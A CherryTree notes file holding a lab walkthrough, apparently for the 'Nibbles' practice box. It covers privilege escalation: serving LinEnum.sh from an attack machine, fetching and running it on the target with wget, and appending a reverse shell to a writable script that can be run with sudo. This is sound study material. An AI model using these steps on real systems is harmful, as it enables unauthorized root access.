<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <node unique_id="15" master_id="0" name="Nibbles - Privilege Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1742904617" ts_lastsave="1742905332">
    <rich_text>
</rich_text>
    <rich_text scale="h1">Nibbles - Privilege Escalation</rich_text>
    <rich_text>


Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the </rich_text>
    <rich_text family="monospace">personal.zip</rich_text>
    <rich_text> file and see a file called </rich_text>
    <rich_text family="monospace">monitor.sh</rich_text>
    <rich_text>.



The shell script </rich_text>
    <rich_text family="monospace">monitor.sh</rich_text>
    <rich_text> is a monitoring script, and it is owned by our </rich_text>
    <rich_text family="monospace">nibbler</rich_text>
    <rich_text> user and writeable.




Let us put this aside for now and pull in </rich_text>
    <rich_text link="webs https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</rich_text>
    <rich_text>  to perform some automated privilege escalation checks. First, download  the script to your local attack VM or the Pwnbox and then start a </rich_text>
    <rich_text family="monospace">Python</rich_text>
    <rich_text> HTTP server using the command </rich_text>
    <rich_text family="monospace">sudo python3 -m http.server 8080</rich_text>
    <rich_text>.



Back on the target type </rich_text>
    <rich_text family="monospace">wget http://&lt;your ip&gt;:8080/LinEnum.sh</rich_text>
    <rich_text>  to download the script. If successful, we will see a 200 success  response on our Python HTTP server. Once the script is pulled over, type  
</rich_text>
    <rich_text family="monospace">chmod +x LinEnum.sh</rich_text>
    <rich_text> to make the script executable and then type </rich_text>
    <rich_text family="monospace">./LinEnum.sh</rich_text>
    <rich_text> to run it. We see a ton of interesting output but what immediately catches the eye are </rich_text>
    <rich_text family="monospace">sudo</rich_text>
    <rich_text> privileges.



The </rich_text>
    <rich_text family="monospace">nibbler</rich_text>
    <rich_text> user can run the file </rich_text>
    <rich_text family="monospace">/home/nibbler/personal/stuff/monitor.sh</rich_text>
    <rich_text>  with root privileges. Being that we have full control over that file, 
 if we append a reverse shell one-liner to the end of it and execute with  </rich_text>
    <rich_text family="monospace">sudo</rich_text>
    <rich_text> we should get a reverse shell back as the root user. Let us edit the </rich_text>
    <rich_text family="monospace">monitor.sh</rich_text>
    <rich_text> file to append a reverse shell one-liner.





If we cat the </rich_text>
    <rich_text family="monospace">monitor.sh</rich_text>
    <rich_text> file, we will see the contents appended to the end. </rich_text>
    <rich_text family="monospace">It  is crucial if we ever encounter a situation where we can leverage a  writeable file for privilege escalation. 
We only append to the end of  the file (after making a backup copy of the file) to avoid overwriting  it and causing a disruption.</rich_text>
    <rich_text> Execute the script with </rich_text>
    <rich_text family="monospace">sudo</rich_text>
    <rich_text>:
</rich_text>
    <encoded_png char_offset="184" justification="left" link="" sha256sum="de1be386e054bbb17c87ae2c0d8cf4ed380973605172687dc204d1d8ec67e7aa"/>
    <encoded_png char_offset="291" justification="left" link="" sha256sum="6786a090713697bc4e1b1332a405a8d6e2a850cdae047fb19ca9b135457eaf7e"/>
    <encoded_png char_offset="559" justification="left" link="" sha256sum="5451fa139c279497e97ee3e67af7b46c25797538258a6a08a183d7c7f0938b68"/>
    <encoded_png char_offset="948" justification="left" link="" sha256sum="5893f551faa2885755ba5fb2ba67c88529e8cbc89595913ae6fe6fadd20155a6"/>
    <encoded_png char_offset="1301" justification="left" link="" sha256sum="5bf06cf9e404f055f82d478f715111b734ea4e3f54ddba26250d353faf0d15d2"/>
  </node>
</cherrytree>
